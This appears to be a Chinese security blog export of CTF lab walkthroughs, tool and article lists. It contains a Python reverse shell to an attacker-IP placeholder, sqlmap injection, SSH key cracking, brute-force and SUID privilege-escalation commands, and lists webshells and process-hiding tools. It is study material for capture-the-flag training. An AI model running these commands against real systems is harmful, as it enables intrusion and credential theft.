1.4 rdremove directory–删除目录 [功能] 删除空子目录 [格式] rd [d:]path [说明] rd是专门删除空子目录的命令。注意两条：一是不能删除非空目录；二是不能删除当前目录。 [举例] 用rd删除purple这个目录 下面我们来运用md, cd, rd这三个命令。 1.5 copycopy在英文中是复制的意思 [功能] 复制一个或一组文件到指定的磁盘或目录中 [格式] copy [C:][path][filename.ext] [C:][path]filename.ext [说明] 复制文件命令基本用法是：“复制 源文件名 目标文件名”。如果只写目标路径而不写目标文件名，表示同名复制；否则称为换名复制。注意换名复制一般不要更改文件扩展名。 [举例] 将C:\purple目录的所有文件复制到软盘，可以打如下命令，请注意当前盘与当前路径不同： C:&gt;copy purple A:\ 如果目标盘上已有同名文件，会出现如下提示，“Overwrite xxxx(Yes/No/All)”此时回答Y则覆盖当前文件，N则保留，A则覆盖此后的所有文件而不再提问。 1.6 deldel是英文delete（删除）的缩写 [功能] 删除指定磁盘、目录中的一个或一组文件 [格式] del [C:][path]filename.ext [说明] 这个命令应小心使用。一旦被删除，将不易恢复。同样可以采用通配符为删除一类文件。当利用.时，为了安全将给出警告，确定方进行删除工作。删除过程如没有信息提示，表示已正确删除。 注意这个命令不能删除具有只读、隐含、系统属性的文件；如果指定文件不存在，则出现“File not found”的提示；DOS对误删除的文件可以用UNDELETE外部命令恢复；它只能删文件，不能删目录。 1.7 renren是英文rename（重新命名）的简写 [功能] 对指定磁盘、目录中的一个文件或一组文件更改名称 [格式] ren [C:][path]filename1[.ext] filename2[.ext] [说明] 改名操作只限于某个文件某组文件的名称，它不会更改文件所在的目录。 如果使用了通配符，则对一批文件进行更名。 1.8 type [功能] 在屏幕上显示文本文件内容命令 [格式] type [C:][path]filename.ext [说明] type命令用来在屏幕上快速、简便地显示文本文件的内容，扩展名为TXT的文件是文本文件。 如果用这个命令显示扩展名为EXE或COM等其它文件， 输出的结果往往是一些乱七八糟的符号并伴有无规则的响铃声，有时甚至会出现死机现象。 1.9 format [功能] 磁盘格式化 [格式] [C:][path]format drive:[/S] [说明] 厂家制造的各种磁盘可用来存储各种操作系统下的文件。不同操作系统的磁盘格式一般是不相同的，是不通用的。format命令就是使一个新的磁盘可以被DOS操作系统识别，即可存储DOS文件。 这个命令对磁盘的格式化过程，实际上是用DOS规定的信息存储格式对磁盘进行规划的过程。格式化磁盘时，要清除磁盘上已经存在的所有数据，在磁盘上写上引导记录，划分出文件分配表和根目录，同时，它还要找出磁盘上的所有坏扇区并作上不可使用的标记。命令参数我们这里只列出了一个：/S。当使用了这个参数后，磁盘格式化并装入操作系统文件，使之变成引导盘。相当于format后再进行下一命令：SYS。 1.10 discopydiskcopy，翻译成中文就是磁盘复制 [功能] 复制出一个和原来磁盘内容一模一样的磁盘 [格式] diskcopy 源驱动器名 目的驱动器名 [说明] 它的主要用途就是用来备份。比如我们的电脑在刚买来时，会随机附带一些设备驱动程序磁盘，这些驱动程序在以后都有可能用到，为防止这些磁盘的损坏，一定要将它们都备份一套，这时，使用diskcopy命令是比较快捷和方便的。 1.11 deltree [功能] 删除目录树 [格式] [C:][path]DELTREE [C1:][path1] [[C2:][path2] […]] [说明] 这个命令将整个指定目录树全部消灭，而不管它是否是只读、隐藏与否。使用应特别小心。它是一个危险命令。 1.12 memmem是memory的缩写 [功能] 该命令用来查看你的计算机内存有多少，以及内存的使用情况。 [格式] 直接键入mem命令 1.13 chkdskchkdsk是check disk的缩写。 [功能] 用来检查你的磁盘的使用情况。 [格式] chkdsk 磁盘名 [说明] 例如要检查A盘使用情况，就输入chkdsk A: ，检查c盘使用情况，就输入chkdsk C: ，如果直接输入chkdsk，就检查当前磁盘的使用情况。 1.14 sys [功能] 传递系统文件命令。将DOS的两个隐含的系统IO.SYS和MSDOS.SYS传送到目标磁盘的特定位置上，并将COMMAND.COM文件复制过去。完成后，目标盘成为DOS的启动盘。 [格式] [C:][path]SYS [C1:][path] d2: [说明] 由于这几个文件需要复制到特定位置上，所以用COPY命令完成的复制未必能够启动机器。能过SYS命令，DOS可以将目标盘已占据特定位置的文件移动，并将系统文件复制到相应位置上。参数C1ath用来指明系统文件所在目录。如不指明，则缺省为当前盘的当前目录。所以这个命令一般要在源盘的根目录进行。 1.15 path [功能] 设定DOS寻找.COM、.EXE、.BAT文件的所在目录 [格式] path=[[drive:]path[;…]]或path 1.16 edit [功能] edit命令是一个简单的编辑软件，我们经常用它来编辑一些程序和批处理文件。 1.17 cls [功能] 清除显示器屏幕上的内容，使DOS提示符到屏幕左上角。 [格式] cls 1.18 time [功能] 显示和设置DOS的系统时间 [格式] time [hh[:mm[:ss[.cc]]] 1.19 date [功能] 显示和设置DOS的系统日期 [格式] date [MM-DD-YY] 1.20 ver [功能] 显示正在运行的DOS系统版本号 [格式] ver 0x02 其他命令attrib…………设置文件属性ctty …………改变控制设备defrag…………磁盘碎片整理doskey…………调用和建立DOS宏命令debug …………程序调试命令emm386…………扩展内存管理fc …………文件比较fdisk …………硬盘分区lh/loadhigh …将程序装入高端内存move …………移动文件，改目录名more …………分屏显示prompt…………设置提示符set …………设置环境变量smartdrv………设置磁盘加速器setver…………设置版本subst …………路径替换vol …………显示指定的磁盘卷标号xcopy …………拷贝目录和文]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>基础教程</tag>
        <tag>DOS命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF考试用题]]></title>
    <url>%2F2019%2F09%2F05%2FCTF%E8%80%83%E8%AF%95%E7%94%A8%E9%A2%98%2F</url>
    <content type="text"><![CDATA[0x00 前言本文是将CTF考题进行整理归纳，方便自己和他人学习使用，有疑问的朋友可以在文章末尾留言交流。 0x010x020x030x04###]]></content>
  </entry>
  <entry>
    <title><![CDATA[CTF竞赛试题（跟新中）]]></title>
    <url>%2F2019%2F09%2F03%2FCTF%E7%AB%9E%E8%B5%9B%E8%AF%95%E9%A2%98%2F</url>
    <content type="text"><![CDATA[0x00 前言 0x01 第一关-不合理的验证方式1.1 题目背景Web 用户的身份验证，及页面操作权限验证是 B/S 系统的基础功能，一个功能复杂的业务应用系统，通过角色授权来控制用户访问。Web 系统的用户登录及页面操作权限验证在处理逻辑上比较复杂，通过 Session 和 Cookie 存储，以及Session 和 Cookie 的过期处理来控制用户身份 。 1.2 题目描述一个 web 系统中管理员账户：admin 中有一串 key，页面只提供了试用账号密码：test test ，我们需要登录进 admin 账户获取 key 来通过本关。 1.3 答案提交 提交得到的 key。 请提交操作过程报告，报告中要包含操作的关键过程描述并附截图，以 WORD方式提交。 1.4 提交key1key：I am admin 1.5 关卡环境 VPC1( 虚拟 PC ）:工具场景：Windows XP 操作系统/BT5 VPC2( 虚拟 PC ）:Window server xp 软件描述:使用工具场景集成的工具软件，参赛者也可以上传工具软件软件到工具场景 关卡环境描述: 学生机与实验室网络直连 VPC 与实验室网络直连 学生机与 VPC 物理链路连通 1.6 参考步骤1.打开浏览器，访问 http://192.168.102.62。 2.使用账号密码：test test 登录 3.使用 Firefox 的 firebug 插件查看 cookies。发现只有 user 段，值为 test。 4.将 test 修改为 admin，再次访问页面，得到 key：I am admin Cookie：判断用户信息的凭据，存储在本地 Test 用户登录产生的 cookie 信息： 0x02 加密与解密的对抗2.1 题目背景数据加密的基本过程就是对原来为明文的文件或数据按某种算法进行处理，使其成为不可读的一段代码，通常称为“密文”，使其只能在输入相应的密钥之后才能显示出本来内容，通过这样的途径来达到保护数据不被非法人窃取、阅读的目的。 该过程的逆过程为解密，即将该编码信息转化为其原来数据的过程 2.2 题目描述一个 web 页面只给了 2 个奇怪的超链接，访问 2 个连接会导致列表的排序不一样。这一关通过观察页面，构造 url，访问得到 key 通过本关。 2.3 答案提交 提交得到的 key。 请提交操作过程报告，报告中要包含操作的关键过程描述并附截图，以 WORD方式提交。 2.4 提交key1key:hello world 2.5 关卡环境 VPC1( 虚拟 PC ） 工具场景：Windows XP 操作系统/BT5 VPC2( 虚拟 PC ）: Window server xp 软件描述:使用工具场景集成的工具软件，参赛者也可以上传工具软件软件到工具场景。 关卡环境描述: 学生机与实验室网络直连 VPC 与实验室网络直连 学生机与 VPC 物理链路连通 2.6 参考步骤1.打开浏览器，访问 http://192.168.102.62。 2.通过查看源码，查看 2 个超链接的地址： 123index.php?word=U0VMRUNUKyUyQStGUk9NK2xhbmd1YWdlK29yZGVyK2J5K3JhbmtpbmcrbGltaXQrMCUyQzQ=index.php?word=U0VMRUNUKyUyQStGUk9NK2xhbmd1YWdlK29yZGVyK2J5K3llYXIrbGltaXQrMCUyQzQ= 3.2 个地址的 Word 参数是 base64 加密，将其解密 4.解密后的字符串：SELECT+%2A+FROM+language+order+by+year+limit+0%2C4是 url 加密，再次解密： 5.解密结果是一个 sql 语句。构造新的语句：SELECT * FROM language order by year将其 url 加密 6.将得到的字符串 base64 加密 7.得到的加密串构造地址： http://192.168.102.62/index.php?word=U0VMRUNUKyorRlJPTStsYW5ndWFnZStvcmRlcitieSt5ZWFy8.访问得到 key:hello world 。 0x03 一个SQL引发的血案3.1 题目背景SQL 注入，就是通过把 SQL 命令插入到 Web 表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令，比如先前的很多影视网站泄露 VIP会员密码大多就是通过WEB表单递交查询字符暴出的，这类表单特别容易受到 SQL 注入式攻击。 3.2 题目描述一个 web 页面列了 2014 年 6 月编程语言排行榜。我们需要通过此页面，查询到数据库里的内容，得到 key。 3.3 答案提交 提交得到的 key。 请提交操作过程报告，报告中要包含操作的关键过程描述并附截图，以 WORD方式提交。 3.4 提交key​ key:I am sql inject 3.5 关卡环境VPC1( 虚拟 PC ） 工具场景：Windows XP 操作系统/BT5VPC2( 虚拟 PC ） Window server xp软件描述 使用工具场景集成的工具软件，参赛者也可以上传工具软件软件到工具场景。关卡环境描述1、学生机与实验室网络直连2、VPC 与实验室网络直连3、学生机与 VPC 物理链路连通 3.6参考步骤1.打开浏览器，访问 http://192.168.102.62。 2.访问超链接：http://192.168.102.62/index.php?id=1通过修改 id 的值可以查看到相应排名的语言 3.访问:http://192.168.102.62/index.php?id=1 and 1=1 返回正确内容。 http://192.168.102.62/index.php?id=1 and 1=2 返回错误内容。 4.通过上面可以判断存在注入。Kali 下使用 sqlmap 获取数据库内容。使用命令：sqlmap -u “http://192.168.102.62/index.php?id=1” –dbs 查看数据库。 使用命令：sqlmap -u “http://192.168.102.62/index.php?id=1” –dump -D “third” 获取数据库内容。得到 key：I am sql inject 0x044.1 题目背景4.2 题目描述4.3 答案提交4.4 提交key4.5 关卡环境4.6参考步骤0x055.1 题目背景5.2 题目描述5.3 答案提交5.4 提交key5.5 关卡环境5.6参考步骤###]]></content>
  </entry>
  <entry>
    <title><![CDATA[优秀资源工具整理（不断更新中）]]></title>
    <url>%2F2019%2F09%2F03%2F%E4%BC%98%E7%A7%80%E8%B5%84%E6%BA%90%E5%B7%A5%E5%85%B7%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[0x00 前言在进行渗透测试的过程中，会用到大量的开源工具，每次在各种网站、论坛和知识星球中看到很多很好的工具，都没有时间进行及时的使用整理，久而久之就忘却了，所以使用该文章将每次碰到的优秀工具记录下来，然后在后期在进行归纳整理，既方便他人，也方便自己。皮卡皮卡~ 0x01 好用工具1.1 B-XSSRF用于检测和跟踪Blind XSS，XXE和SSRF的工具包 https://github.com/SpiderMate/B-XSSRF 1.2 BurpSuite-collectionsBurpSuite收集：包括不限于Burp文章，破解版，插件（非BApp Store），汉化等相关教程 https://github.com/Mr-xn/BurpSuite-collections 1.3 排查网盘信息泄露https://github.com/dongfangyuxiao/py-study/tree/master/py-study/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/%E7%BD%91%E7%9B%98%E6%B3%84%E9%9C%B2 1.4 pocsuite3pocsuite3是由Knownsec 404团队开发的开源远程漏洞测试框架 https://github.com/knownsec/pocsuite3 进程隐藏工具libprocesshider.so 此工具作用为劫持系统的readdir64和readdir函数，隐藏”proxy”进程。 1.5 进程隐藏工具libprocesshider.so此工具作用为劫持系统的readdir64和readdir函数，隐藏”proxy”进程。 1.6 流量代理工具proxyProxy为Dog Tunnel(狗洞)，https://github.com/vzex/dog-tunnel/，go语言编写的流量代理工具： 1.7 冰蝎一句话木马作为新型加密网站管理客户端，冰蝎算是作为中国菜刀的替代者。此次发现的样本为冰蝎JSP一句话木马 https://github.com/rebeyond/Behinder/releases 1.8 JSP WEB后门live_index_bank3.jsp这是一个常规的JAVA WEB后门，通过调用.jsp?nox=”命令”来执行命令 1.9 Linux辅助提权工具LinEnum.sh1.10 脏牛提权工具c0w641.11 内网流量代理工具agent.exeagent.exe是nps工具（https://github.com/cnlh/nps）， 是一款轻量级、高性能、功能强大的内网穿透代理服务器。目前支持tcp、udp流量转发，可支持任何tcp、udp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析等等……），此外还支持内网http代理、内网socks5代理、p2p等，并带有功能强大的web管理端： 1.12 dog-tunnel基于KCP的P2P端口映射工具，同时支持SOCKS5代理 https://github.com/vzex/dog-tunnel/ 1.13 sqlmap4burp ++sqlmap4burp ++是一款兼容于Windows，Mac，Linux的多个系统平台的打嗝与SqlMap的联动插件 1.14 移动安全框架 - MobSFhttps://github.com/MobSF/Mobile-Security-Framework-MobSF/wiki/1.-Documentation 安装部署教程：https://www.mad-coding.cn/2019/10/11/%E4%BD%BF%E7%94%A8docker%E5%AE%89%E8%A3%85%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8%E6%A1%86%E6%9E%B6%EF%BC%88MobSF%EF%BC%89/#0x01-%E5%BC%80%E5%A7%8B%E5%AE%89%E8%A3%85 1.15 简单的iOS应用黑盒评估工具https://github.com/chaitin/passionfruit 1.16 适用于开发人员，逆向工程人员和安全研究人员的动态仪表工具包https://www.frida.re/ 1.17 最先进的XSS扫描仪https://github.com/s0md3v/XSStrike 1.18 XSS知识集合https://github.com/s0md3v/AwesomeXSS#awesome-xss-mind-maps 1.19 Lockdoor-Frameworkhttps://github.com/SofianeHamlaoui/Lockdoor-Framework 1.20 AttackSurfaceMapper(ASM)新型自动化渗透测试工具 https://www.uedbox.com/post/59110/ 0x02 其他工具2.1 URL缩短器polrhttps://github.com/cydrobolt/polr/ 0x03 参考链接http://www.sohu.com/a/324075541_609556]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>安全工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[优秀文章整理]]></title>
    <url>%2F2019%2F09%2F03%2F%E4%BC%98%E7%A7%80%E6%96%87%E7%AB%A0%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[0x00 前言在学习的过程中，会经常浏览一些优质的公众号和论坛文章，但是可能看看以后就过去了，下次在想找的时候就找不到了，为了解决这个问题，我决定自己将一些自己决定还不错的问题记录下来。方便下次查看，同时也能方便他人查看。 0x011.1 记一次另类突破CDN的完全渗透http://www.recorday.cn/index.php/2018/10/17/pentest_bypass_cdn/ 1.2 Android APK脱壳–腾讯乐固、360加固一键脱壳https://www.jianshu.com/p/138c9de2c987 1.3 反弹shell的学习总结-01https://mp.weixin.qq.com/s/-citnkfwGai7KQCIp9G99w 1.4 反弹shell的学习总结-02https://mp.weixin.qq.com/s/S9Luvf2Drj4aDqKWUJjTwg 1.5 使用BurpSuite宏获取CSRF TOKENhttps://ryaninf.github.io/2019/07/15/%E4%BD%BF%E7%94%A8BurpSuite%E5%AE%8F%E8%8E%B7%E5%8F%96CSRF-TOKEN/ 1.6 谈谈php一句话木马的免杀https://saucer-man.com/information_security/248.html 1.7 Web安全攻防:01https://blog.csdn.net/qq_41453285/article/details/94888750 1.8 安全大会资料https://www.hackinn.com/index.php/archives/492/ 1.9 个人年度总结及AWD线下赛复盘https://mp.weixin.qq.com/s?__biz=MzU2NzkxMDUyNg==&amp;mid=2247484891&amp;idx=1&amp;sn=c767bb774c3817ebfccdbb9bdcec4255&amp;chksm=fc974ccacbe0c5dc7018a58ab7cad811b1c0fd8b5b63cf8d448eb1848d8ad307cc11f6b52d50&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1568818208564&amp;sharer_shareid=2fb4b0da16cbda243011c5424b7ee1d8&amp;key=5b405373aa09951d5175a541d875b688d014322753c6ad9ceabfaeaa4f0917e3589dbfe9abc1d6134cdcf069c7210c1e316d1237cd15e0ea8b793e2bf4086b7374f664c2de0b79e40f274869759b7679&amp;ascene=1&amp;uin=NjA3MTQ5MDY2&amp;devicetype=Windows+10&amp;version=62060841&amp;lang=zh_CN&amp;pass_ticket=tmZFm2SQBQxsTJpizTvPQ6G11qxs5HdnP9XAuBoHvQgVZOE6cowZMw47%2B2TG3bKU 1.10 burpsuite使用技巧https://www.cnblogs.com/wanghaihong200/p/8727450.html 1.11 如何成为一个漏洞赏金猎人https://xz.aliyun.com/t/2701 1.12 绕过360进行Word文档钓鱼https://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247487417&amp;idx=1&amp;sn=3c6723d503e868ad45441141208cbf53&amp;chksm=ec1f5a86db68d390e23cee1bd44fa6b27838eb345d13b6b7a1337fa02e0c14cb0f9e98a5aa3d&amp;scene=0&amp;xtrack=1&amp;key=f81bb8c63413c3b3c095879c3ba17c47b1cdd53509ba07ad47b8024c505b3a7d5d2b1625aa10948316860ec42b1a14df6f900f281488992ce8558d2424ca32505471a06da548c52f3636af57c14b63a6&amp;ascene=1&amp;uin=NjA3MTQ5MDY2&amp;devicetype=Windows+10&amp;version=62070141&amp;lang=zh_CN&amp;pass_ticket=lJPluFlihnV9GNIv7W8JKUpyiS%2BngHSS38iX%2FETeKCjli9D5DI%2FHj7sAHPrti3Ae 1.13 利用DOCX文档远程模板注入执行宏https://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&amp;mid=2247487401&amp;idx=1&amp;sn=55821cd34f91e44b5b95934878f8430b&amp;chksm=ec1f5a96db68d3807e3dc359870e30ef68cdca47ba206b3d7788d91ec57b98576586e99f5bea&amp;scene=0&amp;xtrack=1&amp;key=8d3f7565c056ebe6148ab33bf8049f7ac27373f5482b6af07747a3291d4a6ac3923d4d5ed2486cae5a0a7a4ad81c97ae0a011d877b3ce747e9372a29dea6ce2d6f6bf92da5887da6cb45c931ccb46608&amp;ascene=1&amp;uin=NjA3MTQ5MDY2&amp;devicetype=Windows+10&amp;version=62070141&amp;lang=zh_CN&amp;pass_ticket=lJPluFlihnV9GNIv7W8JKUpyiS%2BngHSS38iX%2FETeKCjli9D5DI%2FHj7sAHPrti3Ae 1.14 从 SQL Server 注入到 getshellhttps://mp.weixin.qq.com/s?__biz=MzU2MjM4NDYxOQ==&amp;mid=2247484520&amp;idx=1&amp;sn=c7de3e567ba28a1e2c4553a4cfc4dbc1&amp;chksm=fc6b1feccb1c96fa0780dff20c8ea1599067f02df6e9daa4694a76cb54834525e56e64877577&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1569823777394&amp;sharer_shareid=498525f2ce1126969b23a1b6297670ed#rd 1.15 某CMS最新版本测试全过程（前台Getshell）https://xz.aliyun.com/t/3767#toc-41.16 CTF 学习笔记 04https://www.codetd.com/article/1625703 1.17 SRC漏洞挖掘实用技巧https://mp.weixin.qq.com/s/g-vlNmn4uQKUnBKZ7LMJvA 0x02 移动安全安卓应用安全学习 系列文章Drozer 安装和使用 https://www.jianshu.com/p/168cdd3daa1d Metasploit 安装和使用 https://www.jianshu.com/p/e63006a24603 Frida 安装和使用 https://www.jianshu.com/p/bab4f4714d98 Xposed http://www.520monkey.com/archives/895 Cydia http://www.520monkey.com/archives/1028 移动安全入门指南 https://shuwoom.com/?p=893 权限维持工具 https://mp.weixin.qq.com/s/KdIoPRR8XQPNuRIW3HKoQg 0x03 优秀好文3.1 公众号运营https://www.zhihu.com/question/40636150/answer/826537735]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>优秀文章</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF夺旗培训学习笔记]]></title>
    <url>%2F2019%2F08%2F31%2FCTF%E5%A4%BA%E6%97%97%E5%9F%B9%E8%AE%AD%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[0x00 前言由于公司要派我和其他几个同事一起代表公司去参加一场CTF比赛，所以，就在网上找了一些资料来学习，在这里简单做下学习笔记。 0x01 CTF简介CTF是一-种流行的信息安全竞赛形式，其英文名可直译为“夺得Flag”, 也可意译为“夺旗赛”。其大致流程是，参赛团队之间通过进行攻防对抗、程序分析等形式,率先从主办方给出的比赛环境中得到一-串具有一定格式的字符串或其他内容，并将其提交给主办方，从而夺得分数。为了方便称呼，我们把这样的内容称之为”Flag” CTF比赛中涉及内容比较繁杂，我们要利用所有可以利用的方法获得flag。 CTF比赛中，比赛环境有两种方式：1.给与在同一局域网中的攻击机和靶场机器，以web方式可以访问攻击机，通过攻击机来渗透靶场机器，获取对应的Flag值；（一般情况下给与kali Linux作为攻击机，并且举办方提供计算机）2.给与一个网线接口，用户自备工具，直接连接网线，进行渗透靶场机器，过去对应的flag值。 0x02 CTF夺旗之SSH私钥泄露2.1 前期准备12netdiscover -r ip/network # 发现主机ping ip #测试连通性 2.2 信息探测每一个服务对应计算机的一个端口，用来进行通信。常用端口0~1023端口，在扫描结果中查找特殊端口，针对特殊端口进行探测，尤其对开放大端口的http服务进行排查 2.4 探测大端口的信息对于开放http服务的大端口，可以采取http://ip:port/的形式访问。 查看源代码获取对应信息，如果没有falg信息，使用工具探测隐藏页面。 1dirb http://ip：port/ #对这个服务的隐藏文件进行探测。 发现robots.txt敏感文件 进一步对得到的信息进行探测 2.5 针对隐藏页面分析直接使用浏览器访问，查看效果，对应源代码，可能会获取到flag，或者下一步对应的提示；挖掘ssh信息，不断访问获取更多泄露的ssh秘钥信息下载id_ras,和authorized keys 查看下载的两个秘钥文件信息,尝试使用秘钥登陆未能成功 给id_rsa赋予读写权限 说明：600 == 110 000 000 == rw- — — 2.6 解密ssh秘钥信息使用ssh2john将id_isa秘钥信息转换为john可以识别的信息 12chmod 600 id_isassh2john id_isa &gt; isacrack 利用字典解密isacrack信息 1zcat /usr/share/wordlists/rockyou.txt.gz | john --pipe -rules isacrack 分析用户名、利用ssh登陆服务器 1ssh -i id_isa 用户名@ssh靶场机器IP地址 到这里已经登陆到主机，但是并不是root权限，该如何获取root权限尼？答：深入探测根目录- 查找具有root权限的文件 1find / - perm -4000 2 &gt; /dev/null 0x03. CTF夺旗之SSH服务渗透(拿到第一个用户权限)3.1 ssh协议介绍SSH 未Secure Shell的缩写，有IETF的网络小组（Network Working Group）所定制：SSH未建立在应用层基础上的安全协议SSH是目前较为可靠，专门为远程登录会话和其他网络服务提供安全性的协议，利用SSH协议可以有效防止远程管理过程中信息泄露的问题。SSH最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。SSH在正确使用时可弥补网络中的漏洞。SSH客户端适用于多个平台，几乎所有UNIX平台，Windows平台以及MAC平台，都可以运行SHH，它是基于TCP 22号端口的服务。 3.2 SSH协议认证机制 基于口令的安全验证只要你自己知道账号和口令，就可以登陆到远程主机。所有传输的数据都会被加密，但是不能保证你正在连接的服务器就是你想要的连接的服务器。可能会有别的服务器在冒充真正的服务器，也就是受到“中间人” 这种方式的攻击。 基于秘钥的安全验证需要依靠秘钥，也就是你必须为自己穿件一对秘钥，并把公钥放在需要访问的服务器上，如果你要连接到SSH服务器上，客户端软件就会向服务器发出请求，请求用你的私有秘钥进行安全验证。服务器收到请求之后，先在该服务器上你的主目录下寻找你的公用秘钥，然后把它和你发送过来的私有秘钥进行比较。如果两个秘钥一致，则验证成功，登陆服务器。 id_rsa就是尼的私钥，而id_rsa.pub则是你的公钥 3.3 SSH协议验证机制弱点 基于口令的安全验证基于字典的暴力破解，破解对应用户名和密码，通过SSH客户端连接到远程主机的SSH服务，实现对服务器的一定控制（不一定为root权限） 基于秘钥的安全验证通过对主机信息收集，获取到泄露的用户名和对应的秘钥。 12chmod 600 id_rsassh -i id_rsa 用户名@主机地址 登陆服务器。（不一定是root权限） 3.4 信息探测对于给定IP地址的靶场机器，对其进行渗透测试，首先需要考虑靶场机器开放的服务。 探测靶场开放的服务于服务版本。 1nmap -sV 靶场IP地址 探测靶场全部信息 1nmap -A -v 靶场IP地址 探测靶场的操作系统类型与版本 1nmap -O 靶场IP地址 3.5 分析探测结果对于SSH服务的22端口的靶场，首先考虑， 暴力破解 私钥泄露（私钥有没有对应的密码、是否可以找到私钥的用户名） 对于开放http服务的80端口或者其他端口的靶场,首先考虑: 通过浏览器访问对应的靶场http服务，如http://靶场ip地址：http服务端口 使用探测工具对http的目录进行探测，如dirb http://靶场IP地址：http服务端口 特别注意特殊端口，如8080等大端口号。 3.6 挖掘敏感信息使用浏览器对靶场ip的http服务探测，对页面种展示的内容也要注意，尤其是联系人等信息（有可能就是SSH的用户名信息），递归访问，力争把每一个dirb扫描到的目录页面都访问查看。尤其对robotx.txt，以及一些目录进行访问，挖掘具备利用价值的信息。对于开放ssh服务的靶场，务必要注意是否可以寻找到SSH私钥信息（id_rsa） 挖掘到私钥信息 对于某些靶场，也可以使用nikto扫描器来挖掘敏感信息nikto -host 靶场IP地址特别注意config 等特殊敏感文件，要细读扫描的结果，挖掘可以利用的敏感信息 3.7 利用敏感、弱点信息对挖掘到的SSH秘钥利用 修改id_rsade 权限 1chmod 600 id_rsa 利用私钥登陆服务器 1ssh -i id_rsa 用户名@靶场IP地址 注意：如果id_rsa没有解密密码，可以直接使用。但是如果id_rsa有机密密码，那么就需要进行对应的破解。 使用wget远程下载靶机上的文件 将权限修改为600权限 尝试进行远程终端连接 3.8 扩大战果登陆服务器之后，我们需要做一下操作： 查看当前用户whoami id 查看当前用户的权限 查看根目录寻找flag文件,如果是root权限，那么表明这个靶场就被全部拿下，但是如果不时，就肯定需要提权。一般情况下，flag文件只属于root用户和对应的用户组。 1234cat /etc/passwd //查看所有用户的列表cat /etc/group //查看用户组find / -user 用户名 //查看属于某些用户的文件/tmp //查看缓存文件目录 3.9 深入挖掘通过/etc/crontab文件，设定系统定期执行的任务，编辑，需要root权限。不同的用户都可以有不同的定时任务。cat /etc/crontab 挖掘其他用户是否有定时任务，并查看对应的任务内容。执行的任务肯定对靶场机器的某个文件。如果在/etc/crontab 下有某个用户的定时计划文件，但是具体目录下没有这个定时执行文件，可以自行创建反弹shell，然后netcat执行监听获取对应用户的权限。如果有定时执行的文件，可以切换到对应的目录，查看对应的权限，查看当前用户是否有读写权限。 3.10 反弹shell靶场代码 123456789101112#！/usr/bin/python ##环境变量的书写import os,subprocess,socket #导入第三方库s = socket.socekt(socket.AF_INET,socket.SOCK_STREAM) #创建套接字s.connect(&quot;攻击机ip地址&quot;,&quot;攻击机监听端口&quot;) #利用套接字连接到攻击机的ip地址，以及攻击机监听的端口号#将标准输入输出，以及错误输入输出os.dup2(s.fileno(),0) os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p = subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]) 攻击机netcat命令：nc -lpv 未占用端口 说明： l 表示监听模式 P 表示端口号 v 表示返回详细信息 查看占用端口netstat -pantu 3.11 背水一战万不得已的时候只能对ssh服务进行暴力破解。破解最后一个用户名。破解工具如hydra、medusa等 利用cupp创建字典 123git clone https://github.com/jeanphorn/common-password.gitchmod +x cupp.py./cupp.py -i #以交互的方式创建字典 3.12 使用metasploit破解SSH在终端输入 123456msfconsolemsf&gt; use auxiliary/scanner/ssh/ssh_loginmsf auxiliary(ssh_login)&gt;set rhosts 192.168.1.137msf auxiliary(ssh_login)&gt;set username hadimsf auxiliary(ssh_login)&gt;set pass_file hadi.txtmsf auxiliary(ssh_login)&gt;run 优化会话 12python -c “import pty;pty.spqwn(&apos;/bin/bash&apos;)”su - root 注：暴力破解ssh可以使用超级弱口令工具，支持爆破SSH,FTP,MYSQL等弱口令，Windows版本。 GitHub地址：https://github.com/shack2/SNETCracker 3.13 获取Flag提升到root权限之后，切换目录寻找flag文件。一般情况下，flag文件是在root目录下。cat flag文件名（一般情况 flag.txt） 3.14 总结在对SSH服务渗透中，大部分情况是利用获取的私钥文件，直接使用用户名和私钥文件登陆靶场机器，个别情况进行暴力破解获取用户密码，通过用户名和对应用户登陆靶场机。CTF中要特别注意 /tmp数据缓冲目录 以及 /etc/crontab 设置定时之行文件 0x04 CTF夺旗之SMB信息泄露###]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>夺旗</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[爬取CNNVD上的漏洞预警]]></title>
    <url>%2F2019%2F08%2F30%2F%E7%88%AC%E5%8F%96CNNVD%E4%B8%8A%E7%9A%84%E6%BC%8F%E6%B4%9E%E9%A2%84%E8%AD%A6%2F</url>
    <content type="text"><![CDATA[0x00 前言由于公司原因，本人出差一周，在出差的工作任务有记录CNNVD漏洞预警这项任务，而这样任务简直就是重复造轮子的任务，Ctrl + C ，Ctrl + V ，毫无技术含量不说，还会浪费很多时间，so，我想用爬虫来解决，但是，我又不会写，哈哈，那就百度喽。幸运的是，在百度上找到了爬虫的源码。 0x01 开搞 环境需求： python 3.x 版本 若干第三方模块 1.1 python代码首先先放出代码，这个代码是在百度上找的，我觉得最好的一个代码了，可以自定义爬行的时间范围和页数，真牛X。 